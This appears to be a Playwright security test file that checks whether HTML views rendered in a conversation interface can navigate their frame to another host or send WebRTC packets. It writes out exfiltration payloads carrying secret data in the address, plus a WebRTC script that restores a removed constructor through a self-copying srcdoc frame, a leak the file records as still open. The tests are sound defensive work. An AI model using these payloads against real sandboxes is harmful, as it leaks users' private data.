import { createSocket } from "node:dgram";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import type { Page } from "@playwright/test";
import { expect, test } from "./test";
import {
  apiOrigin,
  rewriteStoredDisplay,
  showView,
  signIn,
  uiOrigin,
  viewFrame,
  viewTitle
} from "./view-fixtures";

// A view cannot move its own frame to another host. Each test plants one way of trying in a
// view, with data in the address, and shows it in the interface. Nothing is refused by the
// test: the other host is a real server on this machine that counts what reaches it, and it
// must count nothing. That the browser refused the move is read from its own log line, so a
// test cannot pass because the view never tried.

/** How long a refused move is given to reach the other host after all. */
const SETTLE_MS = 1_000;
/** How long a view is given to send WebRTC packets. One that may send them does so at once. */
const WEBRTC_WAIT_MS = 3_000;

const refusedByShell =
  /^Framing '[^']*' violates the following Content Security Policy directive: "frame-src 'none'"\./u;
const refusedBySandbox =
  /^Refused to execute the redirect specified via '<meta http-equiv='refresh'/u;

interface OtherHost {
  origin: string;
  /** Method and address of every HTTP request that arrived. */
  requests: string[];
  /** TCP connections opened, whether or not a request followed. */
  connections: number;
  /** Where a WebRTC connection is told to find its STUN server. */
  stunServer: string;
  /** UDP packets that arrived there. */
  packets: number;
  close(): Promise<void>;
}

/** A second host: another name and another port than the instance, on this machine. */
async function startOtherHost(): Promise<OtherHost> {
  const server = createServer((request, response) => {
    host.requests.push(`${request.method ?? ""} ${request.url ?? ""}`);
    response.writeHead(200, { "content-type": "text/html" });
    response.end("<!doctype html><title>Other host</title><p>Other host</p>");
  });
  server.on("connection", () => {
    host.connections += 1;
  });
  // No address: both of the machine's loopback addresses answer, whichever the name finds.
  await new Promise<void>((done) => server.listen(0, done));
  const udp = createSocket("udp4");
  udp.on("message", () => {
    host.packets += 1;
  });
  await new Promise<void>((done) => udp.bind(0, "127.0.0.1", done));
  const name = new URL(apiOrigin).hostname === "localhost" ? "127.0.0.1" : "localhost";
  const port = (address: string | AddressInfo | null) =>
    typeof address === "object" && address ? address.port : 0;
  const host: OtherHost = {
    origin: `http://${name}:${port(server.address())}`,
    requests: [],
    connections: 0,
    stunServer: `stun:127.0.0.1:${udp.address().port}`,
    packets: 0,
    async close() {
      server.closeAllConnections();
      await new Promise((done) => server.close(done));
      await new Promise<void>((done) => udp.close(done));
    }
  };
  return host;
}

const exitTest = test.extend<{ otherHost: OtherHost; refusals: string[] }>({
  otherHost: async ({ page: _page }, use) => {
    const host = await startOtherHost();
    await use(host);
    await host.close();
  },
  // What the browser logged about a move or a script it refused, in every frame of the page.
  refusals: async ({ page }, use) => {
    const refusals: string[] = [];
    page.on("console", (message) => {
      if (message.type() === "error") {
        refusals.push(message.text());
      }
    });
    await use(refusals);
  }
});

type ViewKind = "html.rendered" | "private_hydrated_view";

/** Stores a view of the kind and opens the conversation that shows it. */
async function openView(page: Page, kind: ViewKind, html: string): Promise<void> {
  const headers = await signIn(page, uiOrigin);
  const conversation = await showView(page.request, headers, `<h2>${viewTitle}</h2>${html}`);
  if (kind === "private_hydrated_view") {
    await rewriteStoredDisplay(conversation.id, { kind });
  }
  await page.goto(`${uiOrigin}/c/${encodeURIComponent(conversation.id)}`);
}

interface Exit {
  name: string;
  /** What the view holds to get to `address`. */
  html(address: string): string;
  /** The exit needs the person to click the link with the id `go`. */
  click?: true;
}

const link = (attributes: string) => (address: string) =>
  `<a id="go" ${attributes} href="${address}">Open</a>`;
const script = (body: (address: string) => string) => (address: string) =>
  `<script>${body(JSON.stringify(address))}</script>`;

const scriptedExits: Exit[] = [
  { name: "location.href", html: script((address) => `location.href=${address}`) },
  { name: "location.assign", html: script((address) => `location.assign(${address})`) },
  { name: "location.replace", html: script((address) => `location.replace(${address})`) },
  {
    name: "a meta refresh a script adds",
    html: script(
      (address) =>
        `var refresh=document.createElement("meta");refresh.httpEquiv="refresh";refresh.content="0;url="+${address};document.head.appendChild(refresh)`
    )
  },
  {
    name: "a link a script clicks",
    html: script(
      (address) =>
        `var link=document.createElement("a");link.href=${address};document.body.appendChild(link);link.click()`
    )
  }
];
const metaRefresh: Exit = {
  name: "a meta refresh in its document",
  html: (address) => `<meta http-equiv="refresh" content="0;url=${address}">`
};
const clickedExits: Exit[] = [
  { name: "a link the user clicks", html: link(""), click: true },
  { name: "a download link the user clicks", html: link("download"), click: true }
];

async function tryExit(page: Page, kind: ViewKind, exit: Exit, address: string): Promise<void> {
  await openView(page, kind, exit.html(address));
  if (exit.click) {
    await expect(page.getByText("Loading view…")).toHaveCount(0);
    await viewFrame(page).locator("#go").click();
  }
}

/** The browser said it refused, and after a while the other host has still seen nothing. */
async function expectRefused(
  page: Page,
  otherHost: OtherHost,
  refusals: string[],
  refusal: RegExp
): Promise<void> {
  await expect.poll(() => refusals.filter((text) => refusal.test(text))).toHaveLength(1);
  await page.waitForTimeout(SETTLE_MS);
  expect(otherHost.requests).toEqual([]);
  expect(otherHost.connections).toBe(0);
}

exitTest.describe("a view cannot move its frame to another host", () => {
  exitTest.setTimeout(60_000);

  exitTest("the other host counts what does reach it", async ({ page, otherHost }) => {
    // The same browser, the same host, and a frame nothing holds back.
    await page.goto(`${apiOrigin}/health`);
    await page.setContent(`<iframe src="${otherHost.origin}/hit?exit=control"></iframe>`);

    await expect.poll(() => otherHost.requests).toEqual(["GET /hit?exit=control"]);
    expect(otherHost.connections).toBeGreaterThan(0);
  });

  for (const exit of [...scriptedExits, metaRefresh, ...clickedExits]) {
    exitTest(
      `a view cannot leave its frame through ${exit.name}`,
      async ({ page, otherHost, refusals }) => {
        const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;

        await tryExit(page, "html.rendered", exit, address);

        await expectRefused(page, otherHost, refusals, refusedByShell);
      }
    );
  }

  for (const exit of [metaRefresh, ...clickedExits]) {
    exitTest(
      `a view with private rows cannot leave its frame through ${exit.name}`,
      async ({ page, otherHost, refusals }) => {
        const address = `${otherHost.origin}/hit?exit=${encodeURIComponent(exit.name)}&rows=secret`;

        await tryExit(page, "private_hydrated_view", exit, address);

        // Without scripts the sandbox already refuses a refresh; the shell refuses the links.
        await expectRefused(
          page,
          otherHost,
          refusals,
          exit === metaRefresh ? refusedBySandbox : refusedByShell
        );
      }
    );
  }

  exitTest(
    "a view cannot move its frame to an address of the instance either",
    async ({ page, otherHost, refusals }) => {
      const address = `${apiOrigin}/health?from=view`;
      const asked: string[] = [];
      page.on("request", (request) => {
        if (request.url() === address) {
          asked.push(request.url());
        }
      });

      await openView(
        page,
        "html.rendered",
        `<script>location.href=${JSON.stringify(address)}</script>`
      );

      // `frame-src 'none'` names no address at all: a view can navigate nowhere.
      await expectRefused(page, otherHost, refusals, refusedByShell);
      expect(asked).toEqual([]);
    }
  );
});

// WebRTC is not HTTP: a script names a server and the browser sends it UDP packets. No content
// policy and no sandbox flag forbids that today.

/**
 * Opens a WebRTC connection towards `stunServer`. The view's bootstrap has removed the
 * constructor from the view's own window, so the script writes a frame of its own that holds
 * a copy of itself: the copy passes the view's policy by the same hash, and its window is new.
 */
function webRtcScript(stunServer: string): string {
  return `<script>(function(){if(typeof RTCPeerConnection==="undefined"){addEventListener("message",function(event){if(event.data==="offered"){document.body.setAttribute("data-offered","true")}});var frame=document.createElement("iframe");frame.srcdoc="<body><script>"+document.currentScript.text+"<\\/script>";document.body.appendChild(frame);return}var peer=new RTCPeerConnection({iceServers:[{urls:${JSON.stringify(stunServer)}}]});peer.createDataChannel("rows");peer.createOffer().then(function(offer){return peer.setLocalDescription(offer)}).then(function(){parent.postMessage("offered","*")})})();</script>`;
}

exitTest.describe("WebRTC from a view", () => {
  exitTest.setTimeout(60_000);

  exitTest("a view finds no WebRTC constructor under its name", async ({ page }) => {
    await openView(
      page,
      "html.rendered",
      `<script>document.body.setAttribute("data-webrtc",[typeof RTCPeerConnection,typeof webkitRTCPeerConnection,typeof mozRTCPeerConnection].join(","))</script>`
    );

    // Hardening only: the next test gets the constructor back.
    await expect(viewFrame(page).locator("body")).toHaveAttribute(
      "data-webrtc",
      "undefined,undefined,undefined"
    );
  });

  exitTest(
    "a view that runs scripts still sends WebRTC packets (known and open)",
    async ({ page, otherHost }) => {
      await openView(page, "html.rendered", webRtcScript(otherHost.stunServer));
      await expect(viewFrame(page).locator("body")).toHaveAttribute("data-offered", "true");
      await page.waitForTimeout(WEBRTC_WAIT_MS);

      // Everything above must work. Only the count below is expected to fail, and when it one
      // day holds, a browser has closed WebRTC for such a frame: then this is an ordinary test,
      // and views with private rows may run scripts again.
      exitTest.fail(true, "Known and open: a script-enabled view can send WebRTC packets.");
      expect(otherHost.packets).toBe(0);
    }
  );

  exitTest("a view with private rows sends no WebRTC packet", async ({ page, otherHost }) => {
    await openView(page, "private_hydrated_view", webRtcScript(otherHost.stunServer));
    await expect(viewFrame(page).getByRole("heading", { name: viewTitle })).toBeVisible();
    await expect(page.getByText("Loading view…")).toHaveCount(0);
    await page.waitForTimeout(WEBRTC_WAIT_MS);

    // Its frame runs no script, so nothing in it can open a connection.
    await expect(viewFrame(page).locator("body")).not.toHaveAttribute("data-offered");
    expect(otherHost.packets).toBe(0);
  });
});
